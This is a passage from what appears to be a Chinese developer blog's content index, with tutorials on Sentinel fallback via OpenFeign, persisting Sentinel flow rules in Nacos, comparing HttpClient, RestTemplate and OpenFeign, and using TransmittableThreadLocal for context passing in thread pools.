class="title">id</span>)</span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        CommonResult&lt;Payment&gt; result = restTemplate.getForObject(SERVICE_URL + <span class="string">"/paymentSQL/"</span>+id,CommonResult<span class="class">.<span class="keyword">class</span>,<span class="title">id</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (id == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="comment">//exceptionsToIgnore属性有IllegalArgumentException.class，</span></span><br><span class="line">            <span class="comment">//所以IllegalArgumentException不会跳入指定的兜底程序。</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException (<span class="string">"IllegalArgumentException,非法参数异常...."</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (result.getData() == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException (<span class="string">"NullPointerException,该ID没有对应记录,空指针异常"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Sentinel服务熔断整合OpenFeign"><a href="#Sentinel服务熔断整合OpenFeign" class="headerlink" title="Sentinel服务熔断整合OpenFeign"></a>Sentinel服务熔断整合<strong>OpenFeign</strong></h2><p><strong>修改84模块</strong></p><ul><li>84消费者调用提供者9003</li><li>Feign组件一般是消费侧</li></ul><p>POM</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--SpringCloud openfeign --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-openfeign<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>YML</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 激活Sentinel对Feign的支持</span></span><br><span class="line"><span class="attr">feign:</span></span><br><span class="line">  <span class="attr">sentinel:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>业务类</p><p>带@Feignclient注解的业务接口，fallback = PaymentFallbackService.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.entities.CommonResult;</span><br><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.entities.Payment;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.openfeign.FeignClient;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"></span><br><span class="line"><span class="meta">@FeignClient</span>(value = <span class="string">"nacos-payment-provider"</span>,fallback = PaymentFallbackService<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">interface</span> <span class="title">PaymentService</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="meta">@GetMapping</span>(value = <span class="string">"/paymentSQL/&#123;id&#125;"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult&lt;Payment&gt; <span class="title">paymentSQL</span><span class="params">(@PathVariable(<span class="string">"id"</span>)</span> Long id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.entities.CommonResult;</span><br><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.entities.Payment;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PaymentFallbackService</span> <span class="keyword">implements</span> <span class="title">PaymentService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult&lt;Payment&gt; <span class="title">paymentSQL</span><span class="params">(Long id)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> CommonResult&lt;&gt;(<span class="number">44444</span>,<span class="string">"服务降级返回,---PaymentFallbackService"</span>,<span class="keyword">new</span> Payment(id,<span class="string">"errorSerial"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Controller</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CircleBreakerController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line"><span class="comment">//==================OpenFeign</span></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> PaymentService paymentService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(value = <span class="string">"/consumer/paymentSQL/&#123;id&#125;"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult&lt;Payment&gt; <span class="title">paymentSQL</span><span class="params">(@PathVariable(<span class="string">"id"</span>)</span> Long id)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> paymentService.paymentSQL(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主启动类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.cloud.client.discovery.EnableDiscoveryClient;</span><br><span class="line"></span><br><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableFeignClients</span><span class="comment">//&lt;------------------------</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderNacosMain84</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(OrderNacosMain84<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试 - <a href="http://localhost:84/consumer/paymentSQL/1" target="_blank" rel="noopener">http://localhost:84/consumer/paymentSQL/1</a></p><p>测试84调用9003，此时故意关闭9003微服务提供者，84消费侧自动降级，不会被耗死。</p><p>熔断框架比较</p><div class="table-container"><table><thead><tr><th style="text-align:center"><strong>-</strong></th><th style="text-align:center"><strong>Sentinel</strong></th><th style="text-align:center">Hystrix</th><th style="text-align:center"></th></tr></thead><tbody><tr><td style="text-align:center">隔离策略</td><td style="text-align:center">信号量隔离（并发线程数限流）</td><td style="text-align:center">线程池隔商/信号量隔离</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">熔断降级策略</td><td style="text-align:center">基于响应时间、异常比率、异常数</td><td style="text-align:center">基于异常比率</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">实时统计实现</td><td style="text-align:center">滑动窗口（LeapArray）</td><td style="text-align:center">滑动窗口（基于RxJava）</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">动态规则配置</td><td style="text-align:center">支持多种数据源</td><td style="text-align:center">支持多种数据源</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">扩展性</td><td style="text-align:center">多个扩展点</td><td style="text-align:center">插件的形式</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">基于注解的支持</td><td style="text-align:center">支持</td><td style="text-align:center">支持</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">限流</td><td style="text-align:center">基于QPS，支持基于调用关系的限流</td><td style="text-align:center">有限的支持</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">流量整形</td><td style="text-align:center">支持预热模式匀速器模式、预热排队模式</td><td style="text-align:center">不支持</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">系统自适应保护</td><td style="text-align:center">支持</td><td style="text-align:center">不支持</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">控制台</td><td style="text-align:center">提供开箱即用的控制台，可配置规则、查看秒级监控，机器发观等</td><td style="text-align:center">简单的监控查看</td></tr></tbody></table></div><h2 id="Sentinel持久化规则"><a href="#Sentinel持久化规则" class="headerlink" title="Sentinel持久化规则"></a>Sentinel持久化规则</h2><h2 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h2><p>一旦我们重启应用，sentinel规则将消失，生产环境需要将配置规则进行持久化。</p><h2 id="怎么玩"><a href="#怎么玩" class="headerlink" title="怎么玩"></a>怎么玩</h2><p>将限流配置规则持久化进Nacos保存，只要刷新8401某个rest地址，sentinel控制台的流控规则就能看到，只要Nacos里面的配置不删除，针对8401上sentinel上的流控规则持续有效。</p><p><strong>步骤</strong></p><p>修改cloudalibaba-sentinel-service8401</p><p>POM</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--SpringCloud ailibaba sentinel-datasource-nacos 后续做持久化用到--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.csp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sentinel-datasource-nacos<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>YML</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8401</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloudalibaba-sentinel-service</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span> <span class="comment">#Nacos服务注册中心地址</span></span><br><span class="line">    <span class="attr">sentinel:</span></span><br><span class="line">      <span class="attr">transport:</span></span><br><span class="line">        <span class="attr">dashboard:</span> <span class="string">localhost:8080</span> <span class="comment">#配置Sentinel dashboard地址</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">8719</span></span><br><span class="line">      <span class="attr">datasource:</span> <span class="comment">#&lt;---------------------------关注点，添加Nacos数据源配置</span></span><br><span class="line">        <span class="attr">ds1:</span></span><br><span class="line">          <span class="attr">nacos:</span></span><br><span class="line">            <span class="attr">server-addr:</span> <span class="string">localhost:8848</span></span><br><span class="line">            <span class="attr">dataId:</span> <span class="string">cloudalibaba-sentinel-service</span></span><br><span class="line">            <span class="attr">groupId:</span> <span class="string">DEFAULT_GROUP</span></span><br><span class="line">            <span class="attr">data-type:</span> <span class="string">json</span></span><br><span class="line">            <span class="attr">rule-type:</span> <span class="string">flow</span></span><br><span class="line"></span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoints:</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">      <span class="attr">exposure:</span></span><br><span class="line">        <span class="attr">include:</span> <span class="string">'*'</span></span><br><span class="line"></span><br><span class="line"><span class="attr">feign:</span></span><br><span class="line">  <span class="attr">sentinel:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span> <span class="comment"># 激活Sentinel对Feign的支持</span></span><br></pre></td></tr></table></figure><p>添加Nacos业务规则配置</p><p><img src="../img/sentinel/sentinel32.png" alt=""></p><p>配置内容解析</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[&#123;</span><br><span class="line">    <span class="attr">"resource"</span>: <span class="string">"/rateLimit/byUrl"</span>,</span><br><span class="line">    <span class="attr">"IimitApp"</span>: <span class="string">"default"</span>,</span><br><span class="line">    <span class="attr">"grade"</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">"count"</span>: <span class="number">1</span>, </span><br><span class="line">    <span class="attr">"strategy"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"controlBehavior"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"clusterMode"</span>: <span class="literal">false</span></span><br><span class="line">&#125;]</span><br></pre></td></tr></table></figure><ul><li>resource：资源名称；</li><li>limitApp：来源应用；</li><li>grade：阈值类型，0表示线程数, 1表示QPS；</li><li>count：单机阈值；</li><li>strategy：流控模式，0表示直接，1表示关联，2表示链路；</li><li>controlBehavior：流控效果，0表示快速失败，1表示Warm Up，2表示排队等待；</li><li>clusterMode：是否集群。</li></ul><p>启动8401后刷新sentinel发现业务规则有了</p><p><img src="../img/sentinel/sentinel33.png" alt=""></p><p>快速访问测试接口 - <a href="http://localhost:8401/rateLimit/byUrl" target="_blank" rel="noopener">http://localhost:8401/rateLimit/byUrl</a> - 页面返回<code>Blocked by Sentinel (flow limiting)</code></p><p>停止8401再看sentinel - 停机后发现流控规则没有了</p><p><img src="../img/sentinel/sentinel34.png" alt=""></p><p>重新启动8401再看sentinel</p><ul><li>乍一看还是没有，稍等一会儿(Sentinel懒加载)</li><li>多次调用 - <a href="http://localhost:8401/rateLimit/byUrl" target="_blank" rel="noopener">http://localhost:8401/rateLimit/byUrl</a></li><li>重新配置出现了，持久化验证通过</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> sentinel </tag>
            
            <tag> spring cloud alibaba </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>httpClient、RestTemplate、OpenFeign</title>
      <link href="/2021/11/02/httpClient%E3%80%81RestTemplate%E3%80%81OpenFeign/"/>
      <url>/2021/11/02/httpClient%E3%80%81RestTemplate%E3%80%81OpenFeign/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>系统经常有调用其他系统(or服务)的需求，通过Java发送HTTP请求往往有httpClient、RestTemplate、OpenFeign三种方式，特此总结记录。</p><h2 id="httpclient"><a href="#httpclient" class="headerlink" title="httpclient"></a>httpclient</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>HttpClient是Apache Jakarta Common下的子项目，用来提供高效的、最新的、功能丰富的支持HTTP协议的客户端编程工具包，并且它支持HTTP协议最新的版本和建议。</p><p>HttpClient 相比传统 JDK 自带的<code>URLConnection</code>，增加了易用性和灵活性，它不仅是客户端发送 HTTP 请求变得容易，而且也方便了开发人员测试接口（基于 HTTP 协议的），即提高了开发的效率。</p><p><a href="http://hc.apache.org/index.html" target="_blank" rel="noopener">官网</a></p><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><ol><li><p>创建HttpClient对象。</p></li><li><p>创建请求方法的实例，并指定请求URL。如果需要发送GET请求，创建HttpGet对象；如果需要发送POST请求，创建HttpPost对象。</p></li><li><p>如果需要发送请求参数，可调用HttpGet、HttpPost共同的setParams(HttpParams params)方法来添加请求参数；对于HttpPost对象而言，也可调用setEntity(HttpEntity entity)方法来设置请求参数。</p></li><li><p>调用HttpClient对象的execute(HttpUriRequest request)发送请求，该方法返回一个HttpResponse。</p></li><li><p>调用HttpResponse的getAllHeaders()、getHeaders(String name)等方法可获取服务器的响应头；调用HttpResponse的getEntity()方法可获取HttpEntity对象，该对象包装了服务器的响应内容。程序可通过该对象获取服务器的响应内容。</p></li><li><p>释放连接。无论执行方法是否成功，都必须释放连接</p></li></ol><h2 id="RestTemplate"><a href="#RestTemplate" class="headerlink" title="RestTemplate"></a>RestTemplate</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>RestTemplate 是从 Spring3.0 开始支持的一个 HTTP 请求工具，它提供了常见的REST请求方案的模版，例如 GET 请求、POST 请求、PUT 请求、DELETE 请求以及一些通用的请求执行方法 exchange 以及 execute。RestTemplate 继承自 InterceptingHttpAccessor 并且实现了 RestOperations 接口，其中 RestOperations 接口定义了基本的 RESTful 操作，这些操作在 RestTemplate 中都得到了实现。是比httpClient更优雅的Restful URL访问。默认情况下，RestTemplate默认依赖jdk的HTTP连接工具。可以 通过setRequestFactory属性切换到不同的HTTP源，比如Apache HttpComponents(HttpClient)、Netty和OkHttp。</p><ul><li>RestTemplate是Spring提供的用于访问Rest服务的客户端，</li><li>RestTemplate提供了多种便捷访问远程Http服务的方法,能够大大提高客户端的编写效率。</li><li>调用RestTemplate的默认构造函数，RestTemplate对象在底层通过使用java.net包下的实现创建HTTP 请求，</li><li>可以通过使用ClientHttpRequestFactory指定不同的HTTP请求方式。</li><li>ClientHttpRequestFactory接口主要提供了三种实现方式</li><li>1、SimpleClientHttpRequestFactory方式，此处生成SimpleBufferingClientHttpRequest，使用HttpURLConnection创建底层的Http请求连接</li><li>2、HttpComponentsClientHttpRequestFactory方式，此处生成HttpComponentsClientHttpRequest，使用http client来实现网络请求</li><li>3、OkHttp3ClientHttpRequestFactory方式，此处生成OkHttp3ClientHttpRequest，使用okhttp来实现网络请求</li></ul><p><img src="../img/RestTemplate/RestTemplate.png" alt=""></p><h2 id="OpenFeign"><a href="#OpenFeign" class="headerlink" title="OpenFeign"></a>OpenFeign</h2><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p>虽然RestTemplate已经可以将请求拦截来实现对依赖服务的接口调用，并对Http请求进行封装处理，形成一套模板化的调用方法，但是对服务依赖的调用可能不只一处，一个接口都会被多次调用，所以我们会像前面那样针对各个微服务字形封装一些客户端接口调用类来包装这些依赖服务的调用。</p><p>由于RestTemplate的封装，几乎每一个调用都是简单的模板化内容，Feign在此基础上做了进一步的封装，由它来帮助我们定义和实现依赖服务接口的定义。</p><p>在服务消费者创建服务调用接口，通过@FeignClient注解指定服务名来绑定服务，然后再使用SpringMVC的注解来绑定具体该服务提供的REST接口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@FeignClient</span>(<span class="string">"userService"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserClient</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@RequestMapping</span>(method = RequestMethod.GET, value = <span class="string">"/getuser"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">getuserinfo</span><span class="params">()</span></span>;</span><br><span class="line">     </span><br><span class="line">    <span class="meta">@RequestMapping</span>(method = RequestMethod.GET, value = <span class="string">"/getuser"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getuserinfostr</span><span class="params">()</span></span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在服务消费者的web层进行调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    UserClient userClient;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/getuserinfo"</span>, method = RequestMethod.GET)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">getuserinfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userClient.getuserinfo();</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/getuserinfostr"</span>, method = RequestMethod.GET)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getuserinfostr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userClient.getuserinfostr();</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p><strong>feign和openfeign的区别</strong></p><ol><li>他们底层都是内置了Ribbon，去调用注册中心的服务。</li><li>Feign是Netflix公司写的，是SpringCloud组件中的一个轻量级RESTful的HTTP服务客户端，是SpringCloud中的第一代负载均衡客户端。<br>OpenFeign是SpringCloud自己研发的，在Feign的基础上支持了Spring MVC的注解，如@RequesMapping等等。是SpringCloud中的第二代负载均衡客户端。</li><li>Feign本身不支持Spring MVC的注解，使用Feign的注解定义接口，调用这个接口，就可以调用服务注册中心的服务<br>OpenFeign的@FeignClient可以解析SpringMVC的@RequestMapping注解下的接口，并通过动态代理的方式产生实现类，实现类中做负载均衡并调用其他服务。</li><li>feign已不在维护，openfeign维护频繁。</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 远程调用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TtlExcutors解决父子线程的上下文传递</title>
      <link href="/2021/10/27/TtlExcutors%E8%A7%A3%E5%86%B3%E7%88%B6%E5%AD%90%E7%BA%BF%E7%A8%8B%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%96%87%E4%BC%A0%E9%80%92/"/>
      <url>/2021/10/27/TtlExcutors%E8%A7%A3%E5%86%B3%E7%88%B6%E5%AD%90%E7%BA%BF%E7%A8%8B%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%96%87%E4%BC%A0%E9%80%92/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在项目中出现线程池创建的线程无法获取到创建线程的父线程main线程的信息，采用阿里开源的TtlExcutors线程池解决父子线程上下文传递问题。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><a href="https://github.com/alibaba/transmittable-thread-local" target="_blank" rel="noopener">官方文档</a></p><p>TTL（transmittable-thread-local）是一个线程间传递ThreadLocal，异步执行时上下文传递的解决方案。 整个库的核心是构建在TransmittableThreadLocal类（继承并加强InheritableThreadLocal类）之上，同时包含线程池修饰（ExecutorService/ForkJoinPool/TimerTask）以及Java Agent支持，代码小于1k行，短小精悍。</p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> ThreadPoolExecutor executorService = (ThreadPoolExecutor)Executors.newFixedThreadPool(<span class="number">5</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    executorService.prestartAllCoreThreads();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    TransmittableThreadLocal&lt;String&gt; itl = <span class="keyword">new</span> TransmittableThreadLocal&lt;&gt;();</span><br><span class="line">    itl.set(<span class="string">"msg"</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 使用TtlRunnable或TtlCallable包装原生回调方法</span></span><br><span class="line">    executorService.execute(Objects.requireNonNull(TtlRunnable.get(() -&gt; &#123;</span><br><span class="line">        System.out.println(<span class="string">"InheritableThreadLocal ThreadPoolExecutor by TtlRunnable:"</span> + itl.get());</span><br><span class="line">    &#125;)));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 使用包装TtlExecutors包装原生的ThreadPoolExecutor</span></span><br><span class="line">    <span class="comment">// 1、getTtlExecutor：修饰接口Executor</span></span><br><span class="line">    <span class="comment">// 2、getTtlExecutorService：修饰接口ExecutorService</span></span><br><span class="line">    <span class="comment">// 3、getTtlScheduledExecutorService：修饰接口ScheduledExecutorService</span></span><br><span class="line">    Executor ttlExecutor = TtlExecutors.getTtlExecutor(executorService);</span><br><span class="line">    ttlExecutor.execute(() -&gt; &#123;</span><br><span class="line">        System.out.println(<span class="string">"InheritableThreadLocal ThreadPoolExecutor by TtlExecutors:"</span> + itl.get());</span><br><span class="line">    &#125;);</span><br><span class="line"> </span><br><span class="line">    Thread.sleep(<span class="number">10000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">InheritableThreadLocal ThreadPoolExecutor by TtlRunnable:msg</span><br><span class="line">InheritableThreadLocal ThreadPoolExecutor by TtlExecutors:msg</span><br></pre></td></tr></table></figure><h2 id="实战使用"><a href="#实战使用" class="headerlink" title="实战使用"></a>实战使用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 